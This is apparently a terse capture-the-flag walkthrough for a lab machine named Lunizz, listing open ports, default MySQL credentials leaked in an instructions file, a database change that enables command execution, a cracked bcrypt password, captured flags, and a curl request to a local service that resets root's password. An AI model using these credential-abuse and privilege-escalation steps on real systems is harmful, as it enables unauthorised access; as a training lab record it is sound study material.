# Lunizz_CTF 

> VOiD | Saturday 06 November 2021 09:46:23 PM IST

My IP :10.8.253.221
Target IP : 10.10.106.91



PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack
4444/tcp open  krb524  syn-ack
5000/tcp open  upnp    syn-ack



## PORT 80[http Apache]
/hidden --> upload page

http://10.10.106.91/instructions.txt
```
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE

/whatever --> rce
```
## PORT 3306 [mysql]

Auth Plugin Name: mysql_native_password
```bash
runcheck:CTF_script_cave_changeme

mysql -h 10.10.106.91 -u runcheck -p

use runornot

MySQL [runornot]> select * from runcheck;
+------+
| run  |
+------+
|    0 |
+------+

MySQL [runornot]> update  runcheck set run=1 ;

MySQL [runornot]> select * from runcheck;
+------+
| run  |
+------+
|    1 |
+------+
```


## USER [www-data]
```bash

cat bcrypt_encryption.py 
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
#bcrypt.checkpw()


northernlights

mason : northernlights
cat user.txt 
thm{23cd53cbb37a37a74d4425b703d91883}


active ports
127.0.0.1:8080


curl 127.0.0.1:8080 -d "password=northernlights&cmdtype=passwd"

Password Changed To :northernlights

root@lunizz:/home/adam# cat /root/r00t.txt 
thm{ad23b9c63602960371b50c7a697265db}

```